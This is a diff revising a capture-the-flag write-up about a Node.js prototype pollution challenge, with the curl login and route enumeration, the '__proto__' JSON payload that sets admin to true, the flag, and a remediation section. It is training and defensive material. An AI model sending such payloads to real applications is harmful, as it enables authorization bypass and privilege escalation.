@@ -1,26 +1,36 @@
 # NodeJS Academy: Prototype Pollution
 
-## Challenge Information
+![Category](https://img.shields.io/badge/Category-Web-2563eb?style=flat-square)
+![Runtime](https://img.shields.io/badge/Runtime-Node.js-16a34a?style=flat-square)
+![Bug](https://img.shields.io/badge/Bug-Prototype%20Pollution-dc2626?style=flat-square)
+![Impact](https://img.shields.io/badge/Impact-Admin%20Bypass-f59e0b?style=flat-square)
 
-| Field | Value |
-| --- | --- |
-| Category | Web |
-| Vulnerability | Prototype Pollution |
-| Status | Solved |
+> Objective: use a profile update endpoint to pollute object prototypes and bypass the admin authorization check.
 
-The application was a NodeJS Academy platform where a student account could log in, update a profile, and view a protected admin panel.
+## Executive Summary
 
-The goal was to access the admin area and recover the flag.
+The application exposed a JSON profile update endpoint. Because user-controlled JSON was merged into a server-side object without filtering dangerous keys, a `__proto__` payload could inject `admin: true` into the prototype chain.
 
-## Login
+After pollution, a naive authorization check such as `if (user.admin)` treated the student session as admin and exposed the flag.
 
-The test credentials were:
+## Attack Path
+
+| Step | Action | Result |
+| --- | --- | --- |
+| 1 | Log in with test account | Valid session cookie |
+| 2 | Explore dashboard | `/admin` link discovered |
+| 3 | Inspect profile page | `POST /api/profile` found |
+| 4 | Send `__proto__` JSON | Prototype polluted |
+| 5 | Visit `/admin` | Authorization bypassed |
+| 6 | Grep flag | Flag recovered |
+
+## 1. Authentication
+
+Credentials:
 
 ```text
 etudiant / csia2026
 ```
-
-Login request:
 
 ```bash
 curl -i -c cookies.txt -b cookies.txt \
@@ -28,7 +38,7 @@ curl -i -c cookies.txt -b cookies.txt \
   https://csia-ctf26-prototype-pollution.chals.io/login
 ```
 
-The response redirected to `/dashboard`:
+Successful login:
 
 ```http
 HTTP/1.1 302 Found
@@ -36,7 +46,7 @@ Location: /dashboard
 Set-Cookie: connect.sid=...
 ```
 
-I followed the redirect:
+Dashboard request:
 
 ```bash
 curl -s -L -b cookies.txt \
@@ -44,15 +54,13 @@ curl -s -L -b cookies.txt \
   | tee dash.html
 ```
 
-The dashboard contained a link to the admin panel:
+Interesting link:
 
 ```html
-<a href="/admin">🔒 Admin</a>
+<a href="/admin">Admin</a>
 ```
 
-## Route Discovery
-
-I tested common routes:
+## 2. Route Discovery
 
 ```bash
 for p in dashboard profile update settings api/profile api/update api/settings courses admin flag debug; do
@@ -62,14 +70,14 @@ for p in dashboard profile update settings api/profile api/update api/settings c
 done
 ```
 
-The `/profile` page revealed the endpoint used to update a profile:
+The `/profile` page revealed the update endpoint:
 
 ```text
 POST /api/profile
 Content-Type: application/json
 ```
 
-The page also showed client-side JavaScript sending JSON:
+Client-side request pattern:
 
 ```js
 const res = await fetch('/api/profile', {
@@ -79,11 +87,9 @@ const res = await fetch('/api/profile', {
 });
 ```
 
-## Exploitation: Prototype Pollution
+## 3. Exploitation
 
-The challenge name strongly suggested prototype pollution.
-
-I sent a JSON object containing `__proto__` to pollute the global object prototype:
+Prototype pollution payload:
 
 ```json
 {
@@ -93,7 +99,7 @@ I sent a JSON object containing `__proto__` to pollute the global object prototy
 }
 ```
 
-Exploit request:
+Request:
 
 ```bash
 curl -i -b cookies.txt \
@@ -102,18 +108,16 @@ curl -i -b cookies.txt \
   https://csia-ctf26-prototype-pollution.chals.io/api/profile
 ```
 
-After the pollution, the application treated the current user as an administrator.
+Why this works:
 
-## Flag Retrieval
-
-I accessed the admin panel:
-
-```bash
-curl -s -b cookies.txt \
-  https://csia-ctf26-prototype-pollution.chals.io/admin
+```text
+user.admin does not exist directly
+JavaScript checks the prototype chain
+polluted prototype contains admin=true
+authorization check becomes true
 ```
 
-Direct extraction:
+## 4. Flag Retrieval
 
 ```bash
 curl -s -b cookies.txt \
@@ -133,25 +137,29 @@ CSIA{pr0t0typ3_p0llut10n_m4st3r}
 CSIA{pr0t0typ3_p0llut10n_m4st3r}
 ```
 
-## Root Cause
+## Root Cause Analysis
 
-The vulnerability probably came from an unsafe merge between user-controlled JSON and the profile object.
-
-Typical vulnerable examples:
+The vulnerable pattern was likely an unsafe merge of request JSON into a profile object:
 
 ```js
 Object.assign(user.profile, req.body);
 ```
 
-or:
+or a recursive merge helper:
 
 ```js
 merge(user.profile, req.body);
 ```
 
-If keys such as `__proto__`, `constructor`, and `prototype` are not blocked, an attacker can modify inherited properties.
+Dangerous keys:
 
-If the application checks privileges like this:
+```text
+__proto__
+constructor
+prototype
+```
+
+Risky authorization check:
 
 ```js
 if (user.admin) {
@@ -159,36 +167,21 @@ if (user.admin) {
 }
 ```
 
-then the polluted inherited property can bypass the access control.
-
-## Remediation
-
-- Filter dangerous keys: `__proto__`, `constructor`, `prototype`.
-- Avoid unsafe recursive merge functions.
-- Use `Object.create(null)` for objects that store user-controlled data.
-- Check own properties explicitly:
+Safer check:
 
 ```js
-Object.hasOwn(user, "admin")
+if (Object.hasOwn(user, "admin") && user.admin === true) {
+  // admin access
+}
 ```
 
-instead of:
+## Remediation Matrix
 
-```js
-if (user.admin)
-```
-
-- Keep dependencies up to date.
-
-## Summary
-
-| Step | Action |
+| Weakness | Fix |
 | --- | --- |
-| 1 | Log in with `etudiant / csia2026` |
-| 2 | Discover `/profile` |
-| 3 | Identify `POST /api/profile` |
-| 4 | Send `__proto__` payload |
-| 5 | Pollute the prototype |
-| 6 | Access `/admin` |
-| 7 | Extract the flag |
+| Unsafe object merge | Use hardened merge logic |
+| Dangerous prototype keys accepted | Block `__proto__`, `constructor`, `prototype` |
+| Inherited property used for auth | Check own properties only |
+| Generic objects for untrusted input | Use `Object.create(null)` |
+| Dependency risk | Keep merge libraries patched |
 
